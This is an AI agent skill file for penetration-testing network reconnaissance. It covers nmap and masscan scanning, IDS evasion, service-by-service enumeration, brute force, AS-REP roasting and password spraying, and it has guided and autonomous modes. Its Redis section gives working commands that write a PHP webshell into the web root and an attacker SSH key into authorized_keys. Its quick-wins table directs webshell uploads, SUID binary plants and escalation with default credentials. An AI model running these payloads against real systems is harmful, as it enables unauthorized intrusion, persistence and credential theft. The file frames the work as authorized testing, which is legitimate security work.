---
name: network-recon
description: >
  Network reconnaissance, host discovery, port scanning, and service
  enumeration.
keywords:
  - scan this network
  - nmap
  - port scan
  - enumerate services
  - host discovery
  - recon this target
  - what's running on this host
  - service enumeration
  - network scan
  - find open ports
  - scan this IP
  - scan this subnet
  - enumerate this box
tools:
  - nmap
  - masscan
  - Naabu
  - Shodan
  - nuclei
  - httpx
  - NetExec
  - enum4linux-ng
  - snmpwalk
  - onesixtyone
opsec: medium
---

# Network Reconnaissance

You are helping a penetration tester perform network reconnaissance and service
enumeration. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval. Explain scan types and trade-offs.
  Present findings after each phase. Ask which services to dig into.
- **Autonomous**: Run full recon pipeline, enumerate all services, present complete
  attack surface with routing recommendations. Only pause for aggressive/noisy scans.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones:
  `### [YYYY-MM-DD HH:MM:SS] network-recon → <target>` with discovered hosts, open ports, services.
- **Findings** → append to `engagement/findings.md` when a vulnerability or quick win
  is confirmed (anonymous access, default creds, known CVE).
- **Evidence** → save scan output to `engagement/evidence/` (e.g.,
  `nmap-10.10.10.1.xml`, `smb-enum.txt`).

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[network-recon] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] network-recon → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.

## Skill Routing Is Mandatory

When this skill says "→ STOP. Route to **skill-name**", you MUST load and
follow that skill:

1. Call `get_skill("skill-name")` to load the full skill from the MCP skill-router
2. Read the returned SKILL.md content
3. Follow its instructions end-to-end

Do NOT execute the technique inline — even if the attack path seems obvious or
you already know the technique.

This applies in both guided and autonomous modes. Autonomous mode means you
make routing decisions without asking — it does not mean you skip skills.

If you need a skill but don't know the exact name, use
`search_skills("description of what you need")` to find it. Verify the returned
description matches your scenario before loading.

### Scope Boundary

This skill's scope is **port scanning, service identification, and service-level
quick-win checks** (anonymous access, default creds, banner grabs, known CVE
identification). The moment you identify something actionable, route — do not
exploit it.

You MUST NOT:
- Perform web application testing (directory fuzzing, parameter testing, IDOR,
  injection) — route to **web-discovery**
- Perform AD enumeration beyond initial domain identification — route to
  **ad-discovery**
- Perform privilege escalation enumeration or exploitation — route to
  **linux-discovery** or **windows-discovery**
- Extract or use credentials from captured traffic or files — update state.md
  and return to the orchestrator or route to the appropriate skill
- Establish SSH/WinRM/shell sessions for post-exploitation — update state.md
  with credentials and return to the orchestrator

When you find credentials, access, or confirmed vulns: update state.md, log to
activity.md, and present routing recommendations. Do not continue past recon.

## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip hosts/ports already scanned
- Check known credentials for authenticated enumeration
- Review Blocked section for scan failures

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add each host with open ports, OS, identified services (one-liner each)
- **Access**: Note any anonymous access, default creds, or quick wins found
- **Vulns**: Add confirmed vulnerabilities as one-liners with `[found]` status
- **Pivot Map**: Map which services lead to which attack paths
- **Blocked**: Record scan failures, filtered ports, IDS blocks

## Prerequisites

- Network access to target(s) — direct or via pivot
- Target IP, hostname, or CIDR range
- Scope confirmation (which IPs/ranges are authorized)
- nmap installed (core tool — all other tools optional)

## Privileged Commands

Claude Code cannot execute `sudo` commands. Any command requiring root must be
handed off to the user for manual execution. This applies to:

- **nmap** — SYN scans (`-sS`), UDP scans (`-sU`), OS detection (`-O`), and most NSE scripts that need raw sockets
- **masscan** — all scans (requires raw sockets)
- **responder** — LLMNR/NBNS/mDNS poisoning (requires raw sockets)
- **mount** — NFS/SMB mounting

**Handoff protocol:**

1. Present the full command including `sudo` to the user
2. Specify the output file path (ensure commands include `-oA`, `-oG`, or `-oL` flags)
3. Ask the user to run it in their terminal
4. Read the output file when the user confirms completion
5. Continue analysis based on the parsed output

**nmap always requires the sudo handoff protocol.** Do not run nmap directly —
not even non-privileged scan types like `-sT` or `-sV`. Unprivileged nmap
produces unreliable results (connect scans miss filtered ports, no OS detection,
no raw-socket NSE scripts). Always write a handoff script and wait for the user
to run it and confirm completion before proceeding.

**Non-privileged commands** that CAN be executed directly by Claude for
post-scan service enumeration:
- `httpx`, `netexec`, `nuclei`, `whatweb`, `gobuster`, `ffuf`
- `ldapsearch`, `smbclient`, `rpcclient`, `snmpwalk`

**Autonomous mode:** Batch all pending privileged commands so the user can run
them in one pass. Present them as a numbered list, each with its output file path.

## Step 1: Passive Reconnaissance

Gather information without touching the target. Skip if the target is a lab/CTF
or if scope is a single IP.

**DNS enumeration:**

```bash
# Forward lookups
dig +short A target.com
dig +short AAAA target.com
dig +short MX target.com
dig +short NS target.com
dig +short TXT target.com
dig +short SOA target.com

# Zone transfer attempt
dig axfr target.com @ns1.target.com

# Reverse DNS on a range
for ip in $(seq 1 254); do dig +short -x 10.10.10.$ip 2>/dev/null; done
```

**Passive OSINT (external targets only):**

```bash
# Shodan (if API key available)
shodan host TARGET_IP
shodan search "hostname:target.com"

# Certificate transparency
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Historical DNS
curl -s "https://dns.bufferover.run/dns?q=target.com" | jq .
```

**In guided mode**, present passive findings before moving to active scanning.
Note any hosts, subdomains, or services discovered.

## Step 2: Host Discovery

Identify live hosts in the target range. Skip for single-host targets.

```bash
# ARP ping (fastest — same subnet only)
sudo nmap -sn -PR 10.10.10.0/24 -oG discovery.gnmap

# ICMP echo + TCP SYN(80,443) + TCP ACK(80) + ICMP timestamp (default -sn)
sudo nmap -sn 10.10.10.0/24 -oG discovery.gnmap

# TCP-only host discovery (ICMP blocked)
sudo nmap -sn -PS22,80,135,443,445,3389,8080 10.10.10.0/24 -oG discovery.gnmap

# UDP host discovery
sudo nmap -sn -PU53,161,137 10.10.10.0/24 -oG discovery.gnmap

# Combined — most thorough
sudo nmap -sn -PE -PP -PS21,22,25,80,113,135,443,445,3389,8080 -PU53,111,137,161 10.10.10.0/24 -oG discovery.gnmap
```

**For large ranges (> /16), use masscan for speed:**

```bash
# Fast host discovery
sudo masscan 10.0.0.0/16 -p80,443,445,22 --rate 10000 -oL alive_hosts.txt
```

**Parse live hosts for next steps:**

```bash
# Extract live hosts from nmap greppable output
grep "Status: Up" discovery.gnmap | awk '{print $2}' > live_hosts.txt
```

**In guided mode**, present the list of live hosts. Ask which to scan further
or proceed with all.

## Step 3: Port Scanning

**Default full scan (recommended starting point):**

```bash
# Full TCP scan with service detection, OS fingerprinting, default scripts, verbose
sudo nmap -A -p- -T4 -oA scan_HOSTNAME -vvv TARGET_IP
```

This is the go-to scan for most engagements. `-A` enables OS detection, version
detection, script scanning, and traceroute. `-p-` scans all 65535 ports. `-T4`
is aggressive timing suitable for most networks. `-oA` saves in all formats
(`.nmap`, `.gnmap`, `.xml`).

**When you need different trade-offs:**

```bash
# Quick top-ports scan (initial triage)
sudo nmap -sS -sV --top-ports 1000 -T4 -oA quick_HOSTNAME -vvv TARGET_IP

# Stealthy scan (IDS evasion — slower)
sudo nmap -sS -p- -T2 -f --data-length 50 -oA stealth_HOSTNAME TARGET_IP

# UDP scan (slow but finds SNMP/DNS/TFTP/NTP/IPMI)
sudo nmap -sU --top-ports 50 -sV -T4 -oA udp_HOSTNAME -vvv TARGET_IP

# Combined TCP + UDP
sudo nmap -sS -sU -p T:1-65535,U:53,67,68,69,111,123,137,138,161,162,500,514,520,631,1434,1900,4500,5353,49152 -sV -T4 -oA full_HOSTNAME -vvv TARGET_IP
```

**Scan evasion techniques (when IDS/IPS is blocking scans):**

```bash
# Fragmented packets
sudo nmap -sS -f -p- -T3 -oA evasion_HOSTNAME TARGET_IP

# Decoys (hide real source among fakes)
sudo nmap -sS -D RND:5 -p- -T3 -oA evasion_HOSTNAME TARGET_IP

# Source port spoofing (some firewalls allow 53/80/443)
sudo nmap -sS -g 53 -p- -T3 -oA evasion_HOSTNAME TARGET_IP

# Idle/zombie scan (completely blind — packets come from zombie)
sudo nmap -sI ZOMBIE_IP:80 -p- -oA evasion_HOSTNAME TARGET_IP

# Slow and low (one packet per second)
sudo nmap -sS -p- -T1 --scan-delay 1s -oA evasion_HOSTNAME TARGET_IP
```

**Alternative scanners:**

```bash
# masscan (fastest — use for wide ranges, then nmap for service detection)
sudo masscan TARGET_RANGE -p1-65535 --rate 5000 -oL masscan_results.txt
# Follow up with nmap service detection on discovered ports
cat masscan_results.txt | grep open | awk '{print $4}' | sort -u | \
  xargs -I{} sudo nmap -sV -p$(grep {} masscan_results.txt | awk '{print $3}' | paste -sd,) {} -oA svc_{}

# Naabu (fast port scanner, integrates with nuclei)
naabu -host TARGET_IP -p - -o naabu_results.txt
```

**Parse scan results:**

```bash
# Extract open ports from greppable output
grep "open" scan_HOSTNAME.gnmap | awk -F'[/ ]' '{for(i=1;i<=NF;i++) if($i=="open") print $(i-1)}' | sort -un

# Parse nmap XML (useful for piping to other tools)
xmlstarlet sel -t -m "//port[state/@state='open']" -v "@portid" -o ":" -v "service/@name" -n scan_HOSTNAME.xml
```

## Step 4: Service Enumeration — Per-Port Quick Wins

After port scanning, enumerate each discovered service. This section is organized
by port with quick-win checks that often yield immediate access.

### FTP — Port 21

```bash
# Anonymous login check
nmap -sV -p21 --script ftp-anon,ftp-bounce,ftp-syst TARGET_IP

# Manual anonymous check
ftp TARGET_IP
# login: anonymous / anonymous@

# Brute force (if warranted)
hydra -L users.txt -P passwords.txt ftp://TARGET_IP -t 4
```

**Quick wins:** Anonymous login with write access, writable web root, config files
with credentials, ProFTPD `mod_copy` (CVE-2019-12815), vsftpd 2.3.4 backdoor.

### SSH — Port 22

```bash
# Version and auth methods
nmap -sV -p22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods TARGET_IP

# Check for password auth (vs key-only)
ssh -o PreferredAuthentications=none -o ConnectTimeout=5 root@TARGET_IP 2>&1

# User enumeration (OpenSSH < 7.7 — CVE-2018-15473)
# Use auxiliary/scanner/ssh/ssh_enumusers in Metasploit
```

**Quick wins:** Default creds, key reuse from other hosts, CVE-2018-15473 user enum,
CVE-2024-6387 (regreSSHion — OpenSSH 8.5p1-9.7p1 on glibc systems).

### SMTP — Port 25/465/587

```bash
nmap -sV -p25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln* TARGET_IP

# User enumeration via VRFY/RCPT
smtp-user-enum -M VRFY -U users.txt -t TARGET_IP
smtp-user-enum -M RCPT -U users.txt -t TARGET_IP
smtp-user-enum -M EXPN -U users.txt -t TARGET_IP
```

**Quick wins:** Open relay, user enumeration, NTLM auth info leak
(`MAIL FROM:<> AUTH NTLM` reveals internal hostname/domain).

### DNS — Port 53

```bash
nmap -sV -p53 --script dns-zone-transfer,dns-cache-snoop,dns-nsid TARGET_IP

# Zone transfer
dig axfr @TARGET_IP target.com
host -l target.com TARGET_IP

# Reverse DNS sweep
dnsrecon -r 10.10.10.0/24 -n TARGET_IP

# Subdomain brute force
dnsenum --dnsserver TARGET_IP --enum target.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Quick wins:** Zone transfer (full DNS dump), wildcard records, internal hostnames.

### HTTP/HTTPS — Ports 80, 443, 8080, 8443

```bash
# HTTP enumeration
nmap -sV -p80,443,8080,8443 --script http-title,http-headers,http-methods,http-robots.txt,http-enum TARGET_IP

# Quick tech stack identification
whatweb TARGET_IP
httpx -u TARGET_IP -ports 80,443,8080,8443 -title -tech-detect -status-code -follow-redirects

# Screenshot for visual triage (multiple hosts)
gowitness single TARGET_URL
```

**Quick wins:** Default credentials on management interfaces, exposed admin panels,
directory listing enabled, `.git` or `.svn` directory exposed, phpinfo(),
server-status/server-info.

→ STOP. Route to **web-discovery** — call `get_skill("web-discovery")` and follow its instructions. Pass: target URL, tech stack,
any interesting headers. Do not execute ffuf or web fuzzing commands inline.

### Kerberos — Port 88

```bash
nmap -sV -p88 --script krb5-enum-users TARGET_IP

# Enumerate valid usernames
kerbrute userenum -d DOMAIN --dc TARGET_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP Roasting (no creds needed)
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip TARGET_IP -no-pass -outputfile asrep_hashes.txt
```

**Quick wins:** AS-REP roastable accounts, valid username enumeration.
→ STOP. Route to **ad-discovery** — call `get_skill("ad-discovery")` and follow its instructions. Pass: DC IP, domain name, any creds.
Do not execute AD enumeration commands inline.

### RPC/MSRPC — Ports 111, 135

```bash
# Linux RPC
rpcinfo -p TARGET_IP
showmount -e TARGET_IP  # NFS shares

# Windows RPC
rpcclient -U "" -N TARGET_IP
rpcclient -U "" -N TARGET_IP -c "enumdomusers;enumdomgroups;getdompwinfo"
impacket-rpcdump TARGET_IP | grep -E "Protocol|Provider"
```

**Quick wins:** Null session user enumeration, NFS shares with no_root_squash,
MSRPC endpoint map revealing services.

### SMB — Ports 139, 445

```bash
# Comprehensive SMB enumeration
enum4linux-ng -A TARGET_IP

# NetExec (replaces crackmapexec)
netexec smb TARGET_IP --shares
netexec smb TARGET_IP -u '' -p '' --shares          # Null session
netexec smb TARGET_IP -u 'guest' -p '' --shares     # Guest access

# NSE scripts
nmap -sV -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* TARGET_IP

# smbclient
smbclient -N -L //TARGET_IP/
```

**Quick wins:** Null session (user enum, share listing), guest access to shares,
writable shares (web root, SYSVOL), EternalBlue (MS17-010), SMBGhost
(CVE-2020-0796), PrintNightmare.

→ STOP. Route to **ad-discovery** — call `get_skill("ad-discovery")` and follow its instructions. Pass: DC IP, domain name,
any credentials or null session access. Do not execute AD commands inline.

### LDAP — Ports 389, 636, 3268

```bash
# Anonymous LDAP query
ldapsearch -x -H ldap://TARGET_IP -b "" -s base namingContexts
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description memberOf

# Nmap LDAP scripts
nmap -sV -p389,636,3268 --script ldap-rootdse,ldap-search TARGET_IP
```

**Quick wins:** Anonymous bind with full directory read, password in description
field, domain info disclosure via rootDSE.

→ STOP. Route to **ad-discovery** — call `get_skill("ad-discovery")` and follow its instructions. Pass: DC IP, domain name from
rootDSE, any anonymous bind results. Do not execute LDAP enumeration inline.

### MSSQL — Port 1433

```bash
nmap -sV -p1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info TARGET_IP

# Auth check
impacket-mssqlclient sa:password@TARGET_IP
netexec mssql TARGET_IP -u sa -p '' --local-auth  # Empty password check

# NTLM info leak
nmap -p1433 --script ms-sql-ntlm-info TARGET_IP
```

**Quick wins:** `sa` with empty/default password, NTLM info leak (domain/hostname),
xp_cmdshell enabled.

### Oracle — Port 1521

```bash
nmap -sV -p1521 --script oracle-sid-brute,oracle-tns-version TARGET_IP

# SID enumeration
odat sidguesser -s TARGET_IP
hydra -L sids.txt -s 1521 TARGET_IP oracle-sid

# Default credential check
odat all -s TARGET_IP -p 1521
```

**Quick wins:** Default SIDs (XE, ORCL, PROD), default creds
(SCOTT/TIGER, SYS/CHANGE_ON_INSTALL, SYSTEM/MANAGER).

### MySQL — Port 3306

```bash
nmap -sV -p3306 --script mysql-info,mysql-enum,mysql-empty-password,mysql-vuln* TARGET_IP

# Auth check
mysql -h TARGET_IP -u root -p''  # Empty root password
mysql -h TARGET_IP -u root       # No password at all
```

**Quick wins:** Root with empty password, remote root login enabled, UDF for
command execution.

### RDP — Port 3389

```bash
nmap -sV -p3389 --script rdp-ntlm-info,rdp-enum-encryption TARGET_IP

# NTLM info leak (hostname, domain, FQDN)
nmap -p3389 --script rdp-ntlm-info TARGET_IP

# NLA check
nmap -p3389 --script rdp-enum-encryption TARGET_IP

# BlueKeep check (CVE-2019-0708)
nmap -p3389 --script rdp-vuln-ms12-020 TARGET_IP
```

**Quick wins:** NTLM info leak, BlueKeep (CVE-2019-0708 — Windows 7/2008R2),
NLA disabled (brute force viable), screenshot via `xfreerdp`.

### PostgreSQL — Port 5432

```bash
nmap -sV -p5432 --script pgsql-brute TARGET_IP

# Default creds
psql -h TARGET_IP -U postgres -d postgres
```

**Quick wins:** `postgres` with empty/default password, trust authentication
(no password needed).

### WinRM — Ports 5985, 5986

```bash
netexec winrm TARGET_IP -u USER -p PASSWORD

# Check if WinRM is available
nmap -sV -p5985,5986 TARGET_IP
```

**Quick wins:** Valid domain creds = remote PowerShell. Check with any discovered
credentials.

### Redis — Port 6379

```bash
nmap -sV -p6379 --script redis-info TARGET_IP

# Unauthenticated access
redis-cli -h TARGET_IP info
redis-cli -h TARGET_IP config get *

# RCE via webshell write
redis-cli -h TARGET_IP
> config set dir /var/www/html/
> config set dbfilename shell.php
> set payload "<?php system($_GET['cmd']); ?>"
> save

# RCE via SSH key write
redis-cli -h TARGET_IP
> config set dir /root/.ssh/
> config set dbfilename authorized_keys
> set payload "\n\nssh-ed25519 AAAA... attacker@host\n\n"
> save
```

**Quick wins:** No authentication (default), webshell write to web root,
SSH key injection, `SLAVEOF` replication RCE.

### MongoDB — Port 27017

```bash
nmap -sV -p27017 --script mongodb-info,mongodb-databases TARGET_IP

# Unauthenticated access
mongosh --host TARGET_IP --eval "show dbs"
mongosh --host TARGET_IP --eval "db.adminCommand({listDatabases:1})"
```

**Quick wins:** No authentication, direct database access, credential dump.

### SNMP — Ports 161/162 (UDP)

```bash
# Community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET_IP

# Walk with found community string
snmpwalk -v2c -c public TARGET_IP .1
snmpwalk -v2c -c public TARGET_IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull

# Bulk walk for speed
snmpbulkwalk -v2c -c public TARGET_IP .1 > snmp_full_dump.txt

# Specific OIDs
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.4.1.77.1.2.25  # Windows users
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.6.13.1.3    # TCP connections
snmpwalk -v2c -c public TARGET_IP 1.3.6.1.2.1.25.6.3.1.2  # Installed software
```

**Quick wins:** Default `public`/`private` community strings, user enumeration,
running process list, installed software, network interfaces, Net-SNMP Extend RCE.

### IPMI — Port 623 (UDP)

```bash
nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero TARGET_IP

# Hash dump (cipher zero vulnerability)
ipmitool -I lanplus -H TARGET_IP -U "" -P "" user list
# Metasploit: auxiliary/scanner/ipmi/ipmi_dumphashes
```

**Quick wins:** Cipher 0 (auth bypass), default creds (admin/admin, ADMIN/ADMIN),
RAKP hash disclosure (offline cracking).

### NFS — Port 2049

```bash
showmount -e TARGET_IP
nmap -sV -p2049 --script nfs-ls,nfs-showmount,nfs-statfs TARGET_IP

# Mount and explore
sudo mount -t nfs TARGET_IP:/share /mnt/nfs -o nolock
ls -la /mnt/nfs/
```

**Quick wins:** World-readable shares, writable shares (SUID binary plant),
no_root_squash (root file injection).

### TFTP — Port 69 (UDP)

```bash
nmap -sU -p69 --script tftp-enum TARGET_IP

# Grab common files
tftp TARGET_IP -c get /etc/passwd
tftp TARGET_IP -c get running-config
tftp TARGET_IP -c get startup-config
```

**Quick wins:** Open TFTP with config files, credential files, firmware downloads.

### VNC — Ports 5900-5910

```bash
nmap -sV -p5900-5910 --script vnc-info,vnc-brute TARGET_IP

# Auth check
vncviewer TARGET_IP::5900
```

**Quick wins:** No authentication, weak passwords, CVE-2006-2369 (auth bypass).

## Step 5: OS Fingerprinting

If `-A` didn't provide reliable OS detection:

```bash
# Aggressive OS detection
sudo nmap -O --osscan-guess -oA os_HOSTNAME TARGET_IP

# TCP/IP stack fingerprinting
sudo nmap -O -sV --version-intensity 5 -oA os_HOSTNAME TARGET_IP
```

**Quick heuristics from open ports:**

| Signature | Likely OS |
|-----------|-----------|
| 135, 139, 445, 3389 | Windows |
| 22, 111, 2049 | Linux/Unix |
| 22, 80/443 only | Linux (hardened/web server) |
| 88, 389, 445, 636, 3268 | Domain Controller |
| 5985, 5986 | Windows (WinRM enabled) |
| 548 (AFP) | macOS |

**TTL heuristics (from ping or nmap):**

| TTL Range | Likely OS |
|-----------|-----------|
| 64 | Linux/macOS |
| 128 | Windows |
| 254-255 | Network device (Cisco, etc.) |

## Step 6: Vulnerability Scanning

After service enumeration, run targeted vulnerability checks.

**Nmap NSE vulnerability scripts:**

```bash
# Safe vulnerability checks
sudo nmap -sV --script vuln -p OPEN_PORTS -oA vuln_HOSTNAME TARGET_IP

# Specific vulnerability categories
sudo nmap -sV --script "smb-vuln*" -p445 -oA vuln_HOSTNAME TARGET_IP
sudo nmap -sV --script "http-vuln*" -p80,443 -oA vuln_HOSTNAME TARGET_IP
```

**Nuclei (template-based scanning):**

```bash
# Update templates
nuclei -update-templates

# Full scan
nuclei -u http://TARGET_IP -o nuclei_results.txt

# Specific severity
nuclei -u http://TARGET_IP -severity critical,high -o nuclei_critical.txt

# Technology-specific
nuclei -u http://TARGET_IP -tags cve,misconfig -o nuclei_cve.txt

# Network-level (non-HTTP)
nuclei -target TARGET_IP -t network/ -o nuclei_network.txt
```

**Service-specific vulnerability checks:**

```bash
# EternalBlue (MS17-010)
nmap -p445 --script smb-vuln-ms17-010 TARGET_IP

# BlueKeep (CVE-2019-0708)
nmap -p3389 --script rdp-vuln-ms12-020 TARGET_IP

# Log4Shell probe (HTTP services)
nuclei -u http://TARGET_IP -tags log4j

# Heartbleed
nmap -p443 --script ssl-heartbleed TARGET_IP
```

## Step 7: Multi-Host Workflows

For engagements with multiple targets or subnets.

**Scan pipeline:**

```bash
# 1. Discover live hosts
sudo nmap -sn -PE -PS22,80,135,443,445 10.10.10.0/24 -oG discovery.gnmap
grep "Status: Up" discovery.gnmap | awk '{print $2}' > live_hosts.txt

# 2. Quick port scan all hosts
sudo nmap -sS --top-ports 1000 -T4 -iL live_hosts.txt -oA quick_scan -vvv

# 3. Full scan on interesting hosts
sudo nmap -A -p- -T4 -iL priority_hosts.txt -oA full_scan -vvv

# 4. Service-specific enumeration
netexec smb live_hosts.txt --shares
netexec smb live_hosts.txt -u '' -p '' --shares
```

**HTTP service discovery across multiple hosts:**

```bash
# Find all HTTP services
cat full_scan.gnmap | grep -oP '\d+/open/tcp//http' | sort -u
httpx -l live_hosts.txt -ports 80,443,8080,8443,8000,3000,5000,9090 -title -tech-detect -status-code -o http_services.txt
```

**NetExec for Windows/AD sweep:**

```bash
# SMB signing check (identifies relay targets)
netexec smb live_hosts.txt --gen-relay-list relay_targets.txt

# Password spray (after finding a valid password)
netexec smb live_hosts.txt -u USER -p PASSWORD
netexec winrm live_hosts.txt -u USER -p PASSWORD
netexec mssql live_hosts.txt -u USER -p PASSWORD
```

## Step 8: Output Parsing and State Update

After scanning, parse results into structured form for state management and
next-step routing.

**Parse nmap XML for structured data:**

```bash
# List all hosts with open ports (from XML)
xmlstarlet sel -t -m "//host[ports/port/state/@state='open']" \
  -v "address[@addrtype='ipv4']/@addr" -o " " \
  -m "ports/port[state/@state='open']" -v "@portid" -o "/" -v "service/@name" -o " " \
  -b -n scan_HOSTNAME.xml

# Quick summary
grep "Ports:" scan_HOSTNAME.gnmap | sed 's/Ports: //' | tr ',' '\n'
```

**Update state.md with scan results (format per-host one-liner):**

```
## Targets
- 10.10.10.1 | Windows Server 2019 | DC | 53,88,135,139,389,445,636,3268,3389,5985
- 10.10.10.5 | Ubuntu 22.04 | Web | 22,80,443
- 10.10.10.10 | Windows 10 | Workstation | 135,139,445,3389,5985
```

## Step 9: Routing Decision Tree

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

Based on recon findings, route to the appropriate technique or discovery skill.

### Web Services Found (HTTP/HTTPS)

Ports 80, 443, 8080, 8443, 8000, 3000, 5000, or any HTTP service identified.
→ STOP. Route to **web-discovery** — call `get_skill("web-discovery")` and follow its instructions. Pass: target URL,
technology stack, any interesting headers or responses noted during enumeration.
Do not execute web discovery commands inline.

### Domain Controller Identified

Ports 88 (Kerberos) + 389 (LDAP) + 445 (SMB) indicate an AD domain controller.
→ STOP. Route to **ad-discovery** — call `get_skill("ad-discovery")` and follow its instructions. Pass: DC IP, domain name
(from LDAP rootDSE or SMB OS discovery), any credentials found.
Do not execute AD enumeration commands inline.

### Database Services Exposed

MSSQL (1433), MySQL (3306), PostgreSQL (5432), Oracle (1521), MongoDB (27017).
If credentials found or anonymous access confirmed, enumerate for command
execution or sensitive data.
- MSSQL: Check `xp_cmdshell`, linked servers, NTLM relay opportunity
- MySQL: Check UDF, `INTO OUTFILE`, `LOAD_FILE()`
- PostgreSQL: Check `COPY TO/FROM PROGRAM`
- MongoDB: Dump databases
- Oracle: Check for `DBMS_SCHEDULER`, Java execution

### SMB Shares Accessible

Writable shares, SYSVOL access, or null session enumeration successful.
→ If domain-joined: STOP. Route to **ad-discovery** — call `get_skill("ad-discovery")` and follow its instructions. Pass: DC IP, domain, share access details.
→ Check for sensitive files (config files, credentials, scripts)

### Quick Wins Found

| Finding | Action |
|---------|--------|
| Anonymous FTP with write | Upload webshell if web root, or plant SUID binary |
| Redis unauthenticated | Webshell write or SSH key injection |
| NFS with no_root_squash | SUID binary plant → route to **linux-file-path-abuse** — call `get_skill("linux-file-path-abuse")` and follow its instructions |
| SNMP default community | Extract users, processes, installed software |
| IPMI cipher 0 | Dump hashes → crack → access BMC |
| Default creds on any service | Use them, escalate |
| MS08-067 (CVE-2008-4250) | STOP. Route to **smb-exploitation** — call `get_skill("smb-exploitation")` and follow its instructions. Pass: target IP, OS, vuln confirmed |
| EternalBlue (MS17-010) | STOP. Route to **smb-exploitation** — call `get_skill("smb-exploitation")` and follow its instructions. Pass: target IP, OS, architecture, vuln confirmed |
| SMBGhost (CVE-2020-0796) | STOP. Route to **smb-exploitation** — call `get_skill("smb-exploitation")` and follow its instructions. Pass: target IP, OS build (must be v1903/v1909) |
| MS09-050 (CVE-2009-3103) | STOP. Route to **smb-exploitation** — call `get_skill("smb-exploitation")` and follow its instructions. Pass: target IP, OS (Vista/Server 2008 only) |
| BlueKeep (CVE-2019-0708) | Direct SYSTEM shell (unstable — no dedicated skill yet) |

### Internal Network from a Pivot

If running from a compromised host with access to a new subnet:
→ STOP. Route to **pivoting-tunneling** — call `get_skill("pivoting-tunneling")` and follow its instructions to set up access from attack machine.
→ Then route to **network-recon** again — call `get_skill("network-recon")` on the new range.

### Multiple Attack Surfaces

In **guided** mode, present all findings ranked by exploitability:
1. Known CVEs with public exploits (EternalBlue, BlueKeep, Log4Shell)
2. Default/anonymous access (FTP, Redis, SNMP, NFS)
3. Web applications (→ route to **web-discovery** — call `get_skill("web-discovery")` and follow its instructions)
4. Domain services (→ route to **ad-discovery** — call `get_skill("ad-discovery")` and follow its instructions)
5. Database services with access
6. IPMI/BMC access

In **autonomous** mode, pursue highest-value target first (Domain Controller >
web app with known vuln > database with creds > default service access).

When routing, pass along: target IP, open ports, identified services and versions,
OS, any credentials or access found, current mode.

## Troubleshooting

### Scans returning no results / all ports filtered

Firewall or IDS blocking scans. Try:
1. Source port spoofing: `sudo nmap -sS -g 53 -p- TARGET_IP`
2. Fragmentation: `sudo nmap -sS -f -p- TARGET_IP`
3. Slow down: `sudo nmap -sS -p- -T1 --scan-delay 2s TARGET_IP`
4. Different scan type: `-sA` (ACK) to map firewall rules, `-sW` (Window) for
   open/closed distinction through stateless firewalls
5. From a different source IP (pivot host)

### Nmap service detection wrong or unknown

Increase version detection intensity:
```bash
sudo nmap -sV --version-intensity 9 -p PORT -oA svc_detail_HOSTNAME TARGET_IP
```

Or grab the banner manually:
```bash
nc -nv TARGET_IP PORT
echo "" | nc -nv TARGET_IP PORT
openssl s_client -connect TARGET_IP:PORT  # For TLS services
```

### UDP scan too slow

UDP scanning is inherently slow. Strategies:
1. Scan only the most common UDP ports: `--top-ports 20`
2. Target specific ports: `-p U:53,67,69,111,123,137,161,500,514,1434,5353`
3. Use `--max-retries 1` and `--host-timeout 5m`
4. Use masscan for UDP: `sudo masscan -pU:161,53,123,500 --rate 1000 TARGET_RANGE`

### Running from a pivot with limited tools

If nmap isn't available on the pivot host:
```bash
# Bash TCP port scan
for port in 21 22 25 53 80 110 135 139 143 443 445 993 995 1433 3306 3389 5432 5985 8080; do
  (echo >/dev/tcp/TARGET_IP/$port) 2>/dev/null && echo "OPEN: $port"
done

# Ping sweep with bash
for ip in $(seq 1 254); do
  ping -c 1 -W 1 10.10.10.$ip 2>/dev/null | grep "bytes from" &
done; wait

# Using /dev/tcp for banner grab
exec 3<>/dev/tcp/TARGET_IP/PORT; echo "" >&3; cat <&3; exec 3>&-
```

